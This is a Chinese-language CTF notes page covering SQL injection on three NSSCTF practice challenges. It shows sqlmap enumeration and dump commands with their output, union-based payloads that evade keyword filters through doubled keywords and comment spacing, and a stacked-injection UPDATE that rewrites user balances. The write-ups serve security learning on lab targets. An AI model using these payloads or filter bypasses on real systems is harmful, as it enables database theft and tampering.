---
comments: true
tags:
- notes
- ctf
---

## Sqlmap

> [!quote]
>
> sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches including database fingerprinting, over data fetching from the database, accessing the underlying file system, and executing commands on the operating system via out-of-band connections.
> 
> sqlmap 是一个开源的渗透测试工具，它自动化了检测和利用 SQL 注入漏洞以及接管数据库服务器的过程。它包含一个强大的检测引擎，针对高级渗透测试人员提供了许多专业功能，以及包括数据库指纹识别、从数据库中提取数据、访问底层文件系统以及通过旁路连接在操作系统上执行命令等广泛的功能开关。

- [sqlmap](https://github.com/sqlmapproject/sqlmap/)
	- [用户手册中文版](https://sqlmap.highlight.ink/usage)
	- [sqlmap --tamper 绕过WAF脚本分类整理](https://www.cnblogs.com/hack404/p/16027581.html "发布于 2022-03-19 19:23")
- [sql 注入技巧](https://bbs.kanxue.com/thread-262093.htm#msg_header_h1_1)

## 实战

### [[SWPUCTF 2021 新生赛]easy_sql](https://www.nssctf.cn/problem/387)

```bash title="sql injection"
# 查看网页源码，提示 `wllm`
$ sqlmap -u "http://node4.anna.nssctf.cn:28417/?wllm=x" --batch # ==> 存在注入漏洞

$ sqlmap -u "http://node4.anna.nssctf.cn:28417/?wllm=x" --batch --dbs
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] test
[*] test_db

$ sqlmap -u "http://node4.anna.nssctf.cn:28417/?wllm=x" --batch --current-dbs # ==> test_db

$ sqlmap -u "http://node4.anna.nssctf.cn:28417/?wllm=x" --batch -D test_db --tables
Database: test_db
[2 tables]
+---------+
| test_tb |
| users   |
+---------+

# $ sqlmap -u "http://node4.anna.nssctf.cn:28417/?wllm=x" --batch -D test_db -T users --columns
# Database: test_db
# Table: users
# [3 columns]
# +----------+-------------+
# | Column   | Type        |
# +----------+-------------+
# | id       | int(11)     |
# | password | varchar(50) |
# | username | varchar(50) |
# +----------+-------------+

# $ sqlmap -u "http://node4.anna.nssctf.cn:28417/?wllm=x" --batch -D test_db -T users -C "id, password, username" --dump
# Database: test_db
# Table: users
# [1 entry]
# +----+----------+----------+
# | id | password | username |
# +----+----------+----------+
# | 1  | yyy      | xxx      |
# +----+----------+----------+

$ sqlmap -u "http://node4.anna.nssctf.cn:28417/?wllm=x" --batch -D test_db -T test_tb --columns
Database: test_db
Table: test_tb
[2 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| flag   | varchar(50) |
| id     | int(11)     |
+--------+-------------+

$ sqlmap -u "http://node4.anna.nssctf.cn:28417/?wllm=x" --batch -D test_db -T test_tb -C "flag" --dump
Database: test_db
Table: test_tb
[1 entry]
+----------------------------------------------+
| flag                                         |
+----------------------------------------------+
| NSSCTF{337e15a2-9750-4ac9-8170-fdfbae8b9d5f} |
+----------------------------------------------+
```

> [!flag]
>
> NSSCTF{337e15a2-9750-4ac9-8170-fdfbae8b9d5f}

### [[SWPUCTF 2022 新生赛]ez_sql](https://www.nssctf.cn/problem/2881)

```python
nss=1'
# You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
# 单引号过滤

nss=1' order by 3--
# You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'derby3' LIMIT 0,1' at line 1
# 过滤 or，空格

nss=1'/**/union/**/select/**/group_concat(schema_name)/**/from/**/information_schema.schemata/**/limit/**/0,1#
# You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'select/**/group_concat(schema_name)/**/from/**/infmation_schema.schemata/**/limi' at line 1
# 过滤 union, or

nss=1'/**/uniunionon/**/select/**/group_concat(schema_name)/**/from/**/infoorrmation_schema.schema#
# The used SELECT statements have a different number of columns
# 原始查询列数不同

nss=1'/**/oorrder/**/by/**/4#
# Unknown column '4' in 'order clause'
# 原始查询 3 列

nss=1'/**/uniunionon/**/select/**/1,database(), (select/**/group_concat(schema_name)/**/from/**/infoorrmation_schema.schemata)#
# Flag: NSSCTF{This_1s_F4ke_flag} This is true flag: NSSCTF{Ar3_y0u_K1ngd1ng}
# 假flag，查看第二行

nss=1'/**/uniunionon/**/select/**/1,database(), (select/**/group_concat(schema_name)/**/from/**/infoorrmation_schema.schemata)/**/limit/**/1,1#
# Flag: NSS_db This is true flag: NSS_db,information_schema,mysql,performance_schema,test
# 爆库名，同时得知当前数据库名 NSS_db

nss=1'/**/uniunionon/**/select/**/1,database(), (select/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database())/**/limit/**/1,1#
# Flag: NSS_db This is true flag: NSS_tb,users
# 爆表名，有 NSS_tb, users 两个表

nss=1'/**/uniunionon/**/select/**/1,database(), (select/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='NSS_tb')/**/limit/**/1,1#
# Flag: NSS_db This is true flag: id,Secr3t,flll444g

nss=-1'/**/ununionion/**/select/**/1,database(),(select/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='NSS_tb')/**/limit/**/1,2#

# Flag: NSS_db This is true flag: id,Secr3t,flll444g
# 爆列名字

nss=1'/**/uniunionon/**/select/**/1,database(), (select/**/group_concat(id,Secr3t,flll444g)/**/from/**/NSS_tb)/**/limit/**/1,1#
# Flag: NSS_db This is true flag: 1NSSCTF{790723af-49af-4b7e-803b-ba4f153de2f6}NSSCTF{I_d0nt_want_t0_w4ke_up}
```

> [!flag]
>
> NSSCTF{790723af-49af-4b7e-803b-ba4f153de2f6}

### [[SWPUCTF 2023 秋季新生赛]NSS 大卖场](https://www.nssctf.cn/problem/4507)

拿到题目，简单买了两个，没发现 url 有啥变化；查看网页源码，使用 `'/buy/' + itemId + '#item-' + itemId;` 发送购买请求；查看 hint ，得知表名 iterms 和 users。但是始终没找到注入点……

看过提示，是对 url 发送的请求的拼接导致的注入，猜测是：

```sql
# /buy/$itermId
SELECT * FROM iterms WHERE id='$itermId';
```

```python
http://node4.anna.nssctf.cn:28589/buy/1 or 1=1#
# 芜湖起飞，别想买这些奇怪的东西哦~  SELECT|select|UPDATE|update|WHERE|where| |or|AND|and|ORDER|order|BY|by|--|<|>|!
# 告诉我们过滤了上面这些内容（注意包括空格），但是SQL对大小写完全不敏感，空格使用+过滤
http://node4.anna.nssctf.cn:28589/buy/1';#
# 您！离成功又进了一步！注意有没有忽略一些符号呢？
# 注入成功，证实了我们上面的猜测（其实也是先进行了下面的操作再猜测的）；由于 sql 使用 `;` 分隔语句，那么我们注入的语句中适当添加分号就可以执行任意语句（当然要对应绕过）；此时才发现第一次在 SQL 中使用 `Update` 操作
http://node4.anna.nssctf.cn:28589/buy/1';Update%09users%09Set%09balance=2000000000;#
# 此时发现自己的账户余额变为了 2e9（简单尝试下这也是最高数字了）；同理我们也可以调整商品价格，无论如何买下 flag 即可。
```

> [!flag]
>
> NSSCTF{7216a60b-9832-42c1-8188-86ff3e116300}

> [!extra]-
>
> 看题解，查看页面源码可以看到 `<!-- ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; -->` 分号提示应该和堆叠注入有关，这确实是没想到的……

